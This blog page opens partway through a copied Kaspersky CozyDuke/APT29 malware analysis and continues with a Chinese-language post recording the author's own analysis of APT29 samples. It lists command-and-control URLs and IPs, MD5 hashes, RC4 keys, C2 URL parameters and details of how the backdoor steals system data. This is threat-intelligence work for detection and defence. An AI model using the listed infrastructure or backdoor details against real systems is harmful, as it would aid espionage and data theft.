<p>Finally, this process beacons to <code>www.sanjosemaristas[.]com</code>, which appears to be a site that has been compromised and misused multiple times in the past couple of years.<br>hxxp://<a href="http://www.sanjosemaristas[.]com/app/index.php?{A01BA0AD-9BB3-4F38-B76B-A00AD11CBAAA}">www.sanjosemaristas[.]com/app/index.php?{A01BA0AD-9BB3-4F38-B76B-A00AD11CBAAA}</a>, providing the current network adapter’s service name GUID. It uses standard Win32 base cryptography functions to generate a CALG_RC4 session key to encrypt the collected data communications and POSTs it to the server.</p>
<h3 id="Executable-Signing-Certificates"><a href="#Executable-Signing-Certificates" class="headerlink" title="Executable-Signing Certificates"></a>Executable-Signing Certificates</h3><p>Samples are usually signed with a fake certificate – we’ve seen two instances, one AMD and one Intel:</p>
<p><a target="_blank" rel="noopener" href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061840/FakeCerts.png"><img src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061840/FakeCerts.png" alt="FakeCerts"></a></p>
<h3 id="Configuration-files"><a href="#Configuration-files" class="headerlink" title="Configuration files:"></a>Configuration files:</h3><p>Some of the malware uses an encrypted configuration file which is stored on disk as “racss.dat”. This is encrypted by RC4, using the key {0xb5, 0x78, 0x62, 0x52, 0x98, 0x3e, 0x24, 0xd7, 0x3b, 0xc6, 0xee, 0x7c, 0xb9, 0xed, 0x91, 0x62}. Here’s how it looks decrypted:</p>
<p><a target="_blank" rel="noopener" href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061836/CDconfig.png"><img src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061836/CDconfig.png" alt="CDconfig"></a></p>
<h3 id="Second-stage-malware-and-communications"><a href="#Second-stage-malware-and-communications" class="headerlink" title="Second stage malware and communications:"></a>Second stage malware and communications:</h3><p>The attackers send commands and new modules to be executed to the victims through the C&amp;Cs. The C&amp;C scripts store these temporarily until the victim next connects to retrieve local files. We’ve identified two such files:</p>
<ul>
<li>settings.db</li>
<li>sdfg3d.db</li>
</ul>
<p>Here’s how such a database file appears:</p>
<p><a target="_blank" rel="noopener" href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061832/db.png"><img src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061832/db.png" alt="db"></a></p>
<p>These are BASE64 encoded and use the same RC4 encryption key as the malware configuration.</p>
<p>Decoding them resulted in the following payloads:</p>
<p>59704bc8bedef32709ab1128734aa846, ChromeUpdate.ex_<br>5d8835982d8bfc8b047eb47322436c8a, cmd_task.dll<br>e0b6f0d368c81a0fb197774d0072f759, screenshot_task.dll</p>
<p>Decoding them also resulted in a set of tasking files maintaining agent commands and parameter values:</p>
<p>conf.xml</p>
<p>And a set of “reporting” files, maintaining stolen system “info”, error output, and “AgentInfo” output, from victim systems:</p>
<p>DCOM_amdocl_ld_API_.raw<br>Util_amdave_System_.vol<br>Last_amdpcom_Subsystem_.max<br>Data_amdmiracast_API_.aaf<br>7.txt</p>
<p>screenshot_task.dll is a 32-bit dll used to take a screenshot of the full desktop window and save it as a bitmap in %temp%. The number of times the screenshot is repeated is configurable within the xml task file.</p>
<p>cmd_task.dll is a 32-bit dll that maintains several primitives. It is used to create new processes, perform as a command line shell, and several other tasks.</p>
<p>Each of these payloads is delivered together with a configuration file that explains how to run it, for instance:</p>
<p><a target="_blank" rel="noopener" href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061810/decodedConfig.png"><img src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061810/decodedConfig.png" alt="decodedConfig"></a><br>In another tasking, we notice a tracked victim:</p>
<p><a target="_blank" rel="noopener" href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061756/victimTask.png"><img src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061756/victimTask.png" alt="victimTask"></a></p>
<p>Attackers map a network drive use Microsoft OneDrive to run further tools:</p>
<p><a target="_blank" rel="noopener" href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061752/victimOneDrive.png"><img src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061752/victimOneDrive.png" alt="victimOneDrive"></a></p>
<p>They copy down a base64 encoded document from Microsoft OneDrive to the victim system and decode it there:</p>
<p><a target="_blank" rel="noopener" href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061748/victimDecode.png"><img src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061748/victimDecode.png" alt="victimDecode"></a></p>
<p>Not everything works as planned, so they maintain error reporting facility for the c2 communications:</p>
<p><a target="_blank" rel="noopener" href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061742/victimErrors.png"><img src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061742/victimErrors.png" alt="victimErrors"></a></p>
<p>Furthermore, ChromeUpdate is a 64-bit executable (which appears to be a WEXTRACT package) that oddly drops a 32-bit Dll. Cache.dll is simply stored as a cabinet file in the ChromeUpdate’s resource section.</p>
<p>ChromeUpdate.exe starts the file with “rundll32 cache.dll,ADB_Setup”</p>
<h3 id="Cache-dll-analysis"><a href="#Cache-dll-analysis" class="headerlink" title="Cache.dll analysis"></a>Cache.dll analysis</h3><p><a target="_blank" rel="noopener" href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061828/cachetable.png"><img src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061828/cachetable.png" alt="cachetable"></a></p>
<p>Cache.dll was written in C/C++ and built with a Microsoft compiler.</p>
<p>Cache.dll code flow overview</p>
<ul>
<li>RC4 decrypt hardcoded c2 and urls</li>
<li>resolve hidden function calls</li>
<li>collect identifying victim system data</li>
<li>encrypt collected data</li>
<li>send stolen data to c2 and retrieve commands</li>
</ul>
<h3 id="Cache-dll-code-details"><a href="#Cache-dll-code-details" class="headerlink" title="Cache.dll code details"></a>Cache.dll code details</h3><p>Structurally, “Cache.dll” is a fairly large backdoor at 425KB. It maintains both code and data in the raw, encrypted blobs of data to be decrypted and used at runtime, and hidden functionality that isn’t exposed until runtime. No pdb/debug strings are present in the code.</p>
<p>It maintains eight exports, including DllMain:</p>
<ul>
<li>ADB_Add</li>
<li>ADB_Cleanup</li>
<li>ADB_Initnj</li>
<li>ADB_Load</li>
<li>ADB_Release</li>
<li>ADB_Remove</li>
<li>ADB_Setup</li>
</ul>
<p>ADB_Setup is a entry point that simply spawns another thread and waits for completion.</p>
<p><a target="_blank" rel="noopener" href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061824/CacheDLL_ADB_Setup.png"><img src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061824/CacheDLL_ADB_Setup.png" alt="CacheDLL_ADB_Setup"></a></p>
<p>Above, we see a new thread created with the start address of Cache.dll export  “ADB_Load” by the initial thread.</p>
<p>This exported function is passed control while the initial thread runs a Windows message loop. It first grabs an encrypted blob stored away in a global variable and pulls out 381 bytes of this encrypted data:</p>
<p><a target="_blank" rel="noopener" href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061820/cryptedBlob.png"><img src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061820/cryptedBlob.png" alt="cryptedBlob"></a></p>
<p>The standard win32 api CryptDecrypt uses rc4 to decrypt this blob into a hardcoded c2, url path, and url parameters listed below with a simple 140-bit key “x8BxFFx55x8BxECx83xECx50xA1x84x18x03x68x33xC9x66xF7x45x10xE8x1Fx89x45xFCx8Bx45x14x56”.</p>
<p><a target="_blank" rel="noopener" href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061813/DecryptedBlob.png"><img src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061813/DecryptedBlob.png" alt="DecryptedBlob"></a></p>
<p>The code then decodes this set of import symbols and resolves addresses for its networking and data stealing functionality:</p>
<p>InternetCloseHandle<br>InternetReadFile<br>HttpSendRequestA<br>HttpOpenRequestA<br>HttpQueryInfoA<br>InternetConnectA<br>InternetCrackUrlA<br>InternetOpenA<br>InternetSetOptionW<br>GetAdaptersInfo</p>
<p>Much like the prior office monkey “atiumdag.dll” component, this code collects identifying system information using standard win32 API calls:</p>
<ul>
<li>Computer name – GetComputerNameW</li>
<li>User name – GetUserNameW</li>
<li>Adapter GUID, ip address, mac address – GetAdaptersInfo</li>
<li>Windows version – GetVersionExW</li>
</ul>
<p>It then uses the runtime resolved networking API calls to send the collected data back to a hardcoded c2 and set of urls.</p>
<p>Cache.dll connectback urls:</p>
<ul>
<li>209.200.83.43/ajax/links.php</li>
<li>209.200.83.43/ajax/api.php</li>
<li>209.200.83.43/ajax/index.php</li>
<li>209.200.83.43/ajax/error.php</li>
<li>209.200.83.43/ajax/profile.php</li>
<li>209.200.83.43/ajax/online.php</li>
<li>209.200.83.43/ajax/loader.php</li>
<li>209.200.83.43/ajax/search.php</li>
</ul>
<p>Observed user-agent string on the wire, but it’s dynamically generated based on the Windows system settings (retrieved using standard win32 api “ObtainUserAgentString”):<br>“User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)”</p>
<p>Communications with the CozyDuke C2 include key/value pairs passed as URL parameters. Observed keys that remind us of the Cosmicduke communications include:</p>
<ul>
<li>status=</li>
<li>k=</li>
<li>mode=</li>
<li>ajax=</li>
<li>name=</li>
<li>subNodeId=</li>
<li>nodeId=</li>
<li>r=</li>
<li>t=</li>
<li>id=</li>
<li>item=</li>
<li>item_id=</li>
<li>js=</li>
<li>j=</li>
<li>v=</li>
<li>json=</li>
<li>i=</li>
<li>c=</li>
<li>x=</li>
<li>a=</li>
</ul>
<h3 id="Connections-with-MiniDuke-CosmicDuke-OnionDuke"><a href="#Connections-with-MiniDuke-CosmicDuke-OnionDuke" class="headerlink" title="Connections with MiniDuke/CosmicDuke/OnionDuke:"></a>Connections with MiniDuke/CosmicDuke/OnionDuke:</h3><p>One of the second stage modules of CozyDuke/Cozy Bear, Show.dll, is particularly interesting because it appears to have been built onto the same platform as OnionDuke. Below we compare Show.dll with the OnionDuke sample MD5: c8eb6040fd02d77660d19057a38ff769. Both have exactly the same export tables and appear to be called internally “UserCache.dll”:</p>
<p><a target="_blank" rel="noopener" href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061805/onion.png"><img src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061805/onion.png" alt="onion"></a></p>
<p>This seems to indicate the authors of OnionDuke and CozyDuke / Cozy Bear are the same, or working together.</p>
<p>Another interesting comparison of two other files matches a recent second stage tool from the CozyDuke attacks with a second stage component from other Miniduke/Onionduke attacks.</p>
<p>2e0361fd73f60c76c69806205307ccac, update.dll (MiniDuke), 425kb (internal name = “<strong>UserCache.dll</strong>“)<br>9e3f3b5e9ece79102d257e8cf982e09e, cache.dll (CozyDuke), 425kb (internal name = “<strong>UserCache.dll</strong>“)</p>
<p>The two share identical export function names in their export directories, and the naming appears to be randomly assigned at compile time. The table below presents the function matches based on size data, but the calls, jmps and code all match as well. The contents of only one of these exports in update.dll has no match whatsoever in cache.dll.</p>
<p><a target="_blank" rel="noopener" href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061800/exports.png"><img src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061800/exports.png" alt="exports"></a></p>
<p>Unlike the atiumdag.dll file above, however, cache.dll and update.dll do not maintain anti-AV and anti-analysis functionality sets. Perhaps they plan to pair this stealer with another dropper that maintains the WMI anti-AV functionality. This rotating functionality seems representational for the set, along with other characteristics. Their custom backdoor components appear to slightly evolve over time, with modifications to anti-detection, cryptography, and trojan functionality changing per operation. This rapid development and deployment reminds us of the APT28/Sofacy toolset, especially the coreshell and chopstick components.</p>
<p>We expect ongoing and further activity from this group in the near future and variations on the malware used in previous duke-ish incidents.</p>
<p>For more information about MiniDuke, CosmicDuke and OnionDuke, please see References.</p>
<h3 id="Related-MD5s"><a href="#Related-MD5s" class="headerlink" title="Related MD5s"></a>Related MD5s</h3><p>62c4ce93050e48d623569c7dcc4d0278, 2537.ex_<br>a5d6ad8ad82c266fda96e076335a5080, drop1.ex_<br>93176df76e351b3ea829e0e6c6832bdf, drop1.pd_<br>7688be226b946e231e0cd36e6b708d20, 8.zip<br>fd8e27f820bdbdf6cb80a46c67fd978a, doc853.ex_<br>93176df76e351b3ea829e0e6c6832bdf, doc853.pdf<br>9ad55b83f2eec0c19873a770b0c86a2f, reader_sl.ex_<br>f16dff8ec8702518471f637eb5313ab2 1.ex_<br>8670710bc9477431a01a576b6b5c1b2a<br>93176df76e351b3ea829e0e6c6832bdf, droppedhppscan854.pdf<br>f58a4369b8176edbde4396dc977c9008, droppedreader_sl.ex_<br>83f57f0116a3b3d69ef7b1dbe9943801<br>b5553645fe819a93aafe2894da13dae7<br>acffb2823fc655637657dcbd25f35af8<br>1a42acbdb285a7fba17f95068822ea4e<br>d543904651b180fd5e4dc1584e639b5e<br>d7af9a4010c75af6756a603fd6aef5a4<br>93176df76e351b3ea829e0e6c6832bdf, 3852.pdf<br>f2b05e6b01be3b6cb14e9068e7a66fc1, droppedreader_sl.ex_<br>57a1f0658712ee7b3a724b6d07e97259, dropped3852.ex_<br>93176df76e351b3ea829e0e6c6832bdf, 5463.pdf<br>eb22b99d44223866e24872d80a4ddefd, dropped5463reader_sl.ex_<br>90bd910ee161b71c7a37ac642f910059, dropped5463.ex_<br>1a262a7bfecd981d7874633f41ea5de8<br>98a6484533fa12a9ba6b1bd9df1899dc<br>7f6bca4f08c63e597bed969f5b729c56<br>08709ef0e3d467ce843af4deb77d74d5</p>
<h3 id="Related-CozyDuke-C-amp-Cs"><a href="#Related-CozyDuke-C-amp-Cs" class="headerlink" title="Related CozyDuke C&amp;Cs:"></a>Related CozyDuke C&amp;Cs:</h3><table>
<thead>
<tr>
<th>1234567891011121314151617181920212223</th>
<th>121.193.130.170:443/wp-ajax.php183.78.169.5:443/search.php200.119.128.45:443/mobile.php200.125.133.28:443/search.php200.125.142.11:443/news.php201.76.51.10:443/plugins/json.php202.206.232.20:443/rss.php202.76.237.216:443/search.php203.156.161.49:443/plugins/twitter.php208.75.241.246:443/msearch.php209.40.72.2:443/plugins/fsearch.php210.59.2.20:443/search.php208.77.177.24:443/fsearch.php<a target="_blank" rel="noopener" href="http://www.getiton.hants.org.uk/themes/front/img/ajax.phpwww.seccionpolitica.com.ar:80/galeria/index.php209.200.83.43/ajax/links.php209.200.83.43/ajax/api.php209.200.83.43/ajax/index.php209.200.83.43/ajax/error.php209.200.83.43/ajax/profile.php209.200.83.43/ajax/online.php209.200.83.43/ajax/loader.php209.200.83.43/ajax/search.php">www.getiton.hants.org.uk:80/themes/front/img/ajax.phpwww.seccionpolitica.com.ar:80/galeria/index.php209.200.83.43/ajax/links.php209.200.83.43/ajax/api.php209.200.83.43/ajax/index.php209.200.83.43/ajax/error.php209.200.83.43/ajax/profile.php209.200.83.43/ajax/online.php209.200.83.43/ajax/loader.php209.200.83.43/ajax/search.php</a></th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<h3 id="Appendix-Parallel-and-Previous-Research"><a href="#Appendix-Parallel-and-Previous-Research" class="headerlink" title="Appendix: Parallel and Previous Research"></a>Appendix: Parallel and Previous Research</h3><p><a target="_blank" rel="noopener" href="http://securelist.com/blog/31112/the-miniduke-mystery-pdf-0-day-government-spy-assembler-0x29a-micro-backdoor/">The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor</a>, Securelist, Feb 2013<br><a target="_blank" rel="noopener" href="https://securelist.com/blog/64107/miniduke-is-back-nemesis-gemina-and-the-botgen-studio/">Miniduke is back: Nemesis Gemina and the Botgen Studio</a>, Securelist, July 2014<br><a target="_blank" rel="noopener" href="http://blog.crysys.hu/2014/07/miniduke-2-cosmicduke/">MiniDuke 2 (CosmicDuke)</a>, CrySyS, July 2014<br>[COSMICDUKE Cosmu with a twist of MiniDuke <a target="_blank" rel="noopener" href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/20081948/cosmicduke_whitepaper.pdf">pdf]</a>, F-Secure, September 2014<br><a target="_blank" rel="noopener" href="http://www.leviathansecurity.com/blog/the-case-of-the-modified-binaries/">THE CASE OF THE MODIFIED BINARIES</a>, Leviathan Security, October 2014<br><a target="_blank" rel="noopener" href="http://bartblaze.blogspot.com/2014/09/a-word-on-cosmicduke.html">A word on CosmicDuke</a>, Blaze’s Security Blog, September 2014<br><a target="_blank" rel="noopener" href="https://www.f-secure.com/weblog/archives/00002764.html">OnionDuke: APT Attacks Via the Tor Network</a>, F-Secure, November 2014<br><a target="_blank" rel="noopener" href="https://www.f-secure.com/weblog/archives/00002780.html">The Connections Between MiniDuke, CosmicDuke and OnionDuke</a>, F-Secure, January 2015</p>
<p>Kaspersky Lab products detect the malware used by the CozyDuke threat actor as:<br>HEUR:Trojan.Win32.CozyDuke.gen<br>Trojan.Win32.CozyBear.*</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://spwpun.github.io/2019/12/16/apt29%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Demen Lee">
      <meta itemprop="description" content="Sharing, Communicating more, then moving on......">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Spwpun's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2019/12/16/apt29%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/" class="post-title-link" itemprop="url">apt29样本分析记录</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2019-12-16 23:13:57" itemprop="dateCreated datePublished" datetime="2019-12-16T23:13:57+08:00">2019-12-16</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-09-20 00:38:52" itemprop="dateModified" datetime="2020-09-20T00:38:52+08:00">2020-09-20</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/" itemprop="url" rel="index"><span itemprop="name">样本分析</span></a>
                </span>
            </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/2019/12/16/apt29%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2019/12/16/apt29%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>凭着记忆和网上公开的资料写下的分析记录，因为是公司的任务，具体的分析文件（样本、.idb…）不能泄露。其实网上大部分都有记录了的，尤其是一些国外的威胁情报网站。</p>
<h4 id="0354FE2800A994CE774F6BBA385BF9F0"><a href="#0354FE2800A994CE774F6BBA385BF9F0" class="headerlink" title="0354FE2800A994CE774F6BBA385BF9F0"></a>0354FE2800A994CE774F6BBA385BF9F0</h4><p>Dll文件，微步查出的恶意评分为60，看到其中一个杀软爆出的为Trojan.Cozer的变种，然后去搜索了一下Cozer是个什么木马，百度太垃圾了，搜不到。谷歌搜索之后，<a target="_blank" rel="noopener" href="https://www.symantec.com/security-center/writeup/2015-030500-0430-99">在赛门铁克的网站上找到了对该木马的描述</a>。</p>
<blockquote>
<p> Trojan.Cozer is a Trojan horse that opens a back door on the compromised computer. </p>
</blockquote>
<p>最后分析出来其存在以下特征：</p>
<ul>
<li><p>由于是Dll文件，所以可能需要其他exe程序来调用。</p>
</li>
<li><p>在其DLLMain函数中会解码文件中固定的数据，解码的方式好像都是特定的<code>用字符串的索引值与该索引处的字符的ASC码异或，再与一个特定的值异或</code>，最后得到的都是固定的值，下方给出的IOC信息对应的样本也是一样，固定的数据不同，导致特定的那个异或值也不同。</p>
</li>
<li><p>经过解码得到的字符串如下：</p>
<ul>
<li><code>Software\Classes\CLSID\&#123;603D3801-BD81-11D0-A3A5-00C04FD706EC&#125;</code></li>
<li><code>Parameters</code></li>
</ul>
<p>上面的两个字符串指向的是注册表中的CLSID处的值，如果电脑中存在此注册表的值，就会执行Parameters处指向的程序，猜测这里应该就是后门程序安装之后设置的注册表的值吧。</p>
</li>
</ul>
<p>下面则是其他的具有相同特征的样本的HASH值：</p>
<p>D36351AF2453640663BBA20D365E5383 (64bit，Dll)</p>
<p>913967B243FD49FFAD3DE984642E2EBA </p>
<p>3C8469D2C5AF6AB277A6BE483A1775F5(64bit，Dll)</p>
<h4 id="95B3EC0A4E539EFAA1FAA3D4E25D51DE"><a href="#95B3EC0A4E539EFAA1FAA3D4E25D51DE" class="headerlink" title="95B3EC0A4E539EFAA1FAA3D4E25D51DE"></a>95B3EC0A4E539EFAA1FAA3D4E25D51DE</h4><p>这是一个具有迷惑性的样本，执行后会在Temp目录下生成两个exe文件，<code>Monkeys.exe</code>和<code>player.exe</code>其中第一个程序是正常无毒的程序，恶意行为都在<code>player.exe</code>中。</p>
<p><code>player.exe</code>会在<code>Roaming</code>目录下生成另外一组恶意程序（包含Dll），然后删除自身。</p>
<p><code>Roaming</code>目录下恶意程序都在<code>ATI_Subsystem</code>目录中，包含<code>amdocl_as32.exe</code>和<code>atiumdag.dll</code>，<code>admhcp32.dll</code>,<code>aticaldd.dll</code>，<code>racss.dat</code>。其中跟踪到的执行恶意连接行为的cmdline为：<code>amdocl_as32.exe  atiumdag.dll,ADL2_ApplicationProfiles_System_Reload_SEH</code>。</p>
<p>使用<code>SystemTracer</code>监测到有DNS查询记录<code>www.sanjosemaristas[.]com</code>.然后使用PCHunter修改Hosts文件，使得该域名指向另外一台准备好的虚拟机，这样就能进一步跟踪行为，使用<code>HFS</code>在另外一台虚拟机上面搭建简单的<code>HTTP</code>服务器。就可以进一步跟踪使用wireshark抓包，发现样本会请求该域名下的<code>app/index.php</code>文件。</p>
<h4 id="94C9DF2E1357E32D97ADD13FE8A91A89"><a href="#94C9DF2E1357E32D97ADD13FE8A91A89" class="headerlink" title="94C9DF2E1357E32D97ADD13FE8A91A89"></a>94C9DF2E1357E32D97ADD13FE8A91A89</h4><p>该样本是一个32bit的Dll文件，使用IDA打开可以查看编译信息，原始的文件名我忘记叫什么去了，不过和上面那个样本释放出来的Dll文件类似。</p>
<p>该样本有一个导出函数也和上面的Dll的导出函数类似，该样本会通过调用LoadLibrary和GetProcAddress这两个函数来获取网络连接的API的函数地址，然后以指针的形式放在全局数组中，需要时就会通过寄存器赋值的方式调用API实现网络通信。其中存在很多敏感的字符串，全部都是编码过后存放在数据段的，解码的方式同上面几个样本中提到的基本类似，只是简单的异或。样本会新建一个大小为<code>0x11B8</code>的堆，然后用来存放获取到的本地主机的信息，包括系统版本信息、电脑名、用户名、网卡信息等等，不过在这个堆的第4-8个字节处存放的是固定的大小<code>0x11C</code>,在内存中以小端的方式存储就是<code>1C 01 00 00</code>，我查过<code>GetVersion</code>这个函数返回的结构体的大小应该为<code>0x114</code>,这里却很奇怪的固定赋值为<code>0x11C</code>。</p>
<p>后续对该样本进行调试，发现其网络连接行为同上面的第二类样本一致。</p>
<h4 id="IOC"><a href="#IOC" class="headerlink" title="IOC"></a>IOC</h4><p>TCP connect：<code>http://www.sanjosemaristas[.]com</code></p>
<p>Http GET: <code>http://www.sanjosemaristas[.]com/app/index.php</code></p>
<p>其实这个样本还有很多地方值得深思，很多编写的技巧都很巧妙，我也许应该从微步上面把这个样本下载下来好好研究一下。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Demen Lee"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">Demen Lee</p>
  <div class="site-description" itemprop="description">Sharing, Communicating more, then moving on......</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">32</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">10</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">33</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/spwpun" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;spwpun" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:spwpun@gmail.com" title="E-Mail → mailto:spwpun@gmail.com" rel="noopener" target="_blank"><i class="fab fa-envelope fa-fw"></i>E-Mail</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://weibo.com/u/5536839794" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;u&#x2F;5536839794" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://music.163.com/#/user/home?id=127070793" title="Netease → https:&#x2F;&#x2F;music.163.com&#x2F;#&#x2F;user&#x2F;home?id&#x3D;127070793" rel="noopener" target="_blank"><i class="fab fa-instagram fa-fw"></i>Netease</a>
      </span>
  </div>


  <div class="links-of-blogroll motion-element">
    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
      Links
    </div>
    <ul class="links-of-blogroll-list">
        <li class="links-of-blogroll-item">
          <a href="https://whale3070.github.io/" title="https:&#x2F;&#x2F;whale3070.github.io" rel="noopener" target="_blank">Whale3070</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://eternalhikari.github.io/" title="https:&#x2F;&#x2F;eternalhikari.github.io" rel="noopener" target="_blank">Hikari</a>
        </li>
    </ul>
  </div>

      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="flag-checkered"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Spwpun</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
